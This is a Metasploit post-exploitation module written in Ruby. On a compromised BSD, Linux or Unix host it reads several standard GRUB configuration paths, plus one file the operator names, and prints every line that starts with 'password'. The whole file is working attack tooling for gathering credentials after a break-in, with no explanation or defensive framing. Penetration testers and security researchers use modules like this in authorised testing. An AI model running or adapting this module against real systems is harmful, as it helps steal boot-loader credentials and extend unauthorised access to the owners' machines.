##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize(info = {})
    super(update_info(
      info,
      'Name'           => 'Multi Gather Grub Password Collection',
      'Description'    => %q(
        This module will collect lines starting with "password" from known grub
        configuration locations.
      ),
      'License'        => MSF_LICENSE,
      'Author'         => ['Taeber Rapczak <taeber@rapczak.com>'],
      'Platform'       => %w[bsd linux unix],
      'SessionTypes'   => %w[meterpreter shell]
    ))

    register_options(
      [
        OptString.new(
          'FILENAME',
          [false, 'Additional grub configuration filename.', '']
        ),
      ]
    )

    @files = %w[
      /boot/grub/grub.conf
      /boot/grub/grub.cfg
      /boot/grub/menu.lst
      /etc/grub.conf
      /etc/grub/grub.cfg
      /etc/grub.d/00_header
      /mnt/sysimage/boot/grub.conf
      /mnt/boot/grub/grub.conf
      /rpool/boot/grub/grub.cfg
    ]
  end

  def find_passwords(filename)
    return if filename.to_s.strip.empty?

    inform "Checking #{filename}"

    if !readable? filename
      inform "#{filename} not found or unreadable"
      return
    end

    @found += 1

    content = read_file filename
    content = content.split "\n" if content.is_a? String
    content.each do |line|
      next unless line.start_with? 'password'

      print_good "#{filename}:#{line}"
    end
  end

  def run
    @found = 0
    inform 'Finding grub configuration files'

    files = Array.[](*@files, datastore['FILENAME'])
    files.each { |filename| find_passwords filename }

    print_status "Grub configuration files found and checked: #{@found}."
  end

  private

  def inform(message)
    print_status message if datastore['VERBOSE']
  end

end
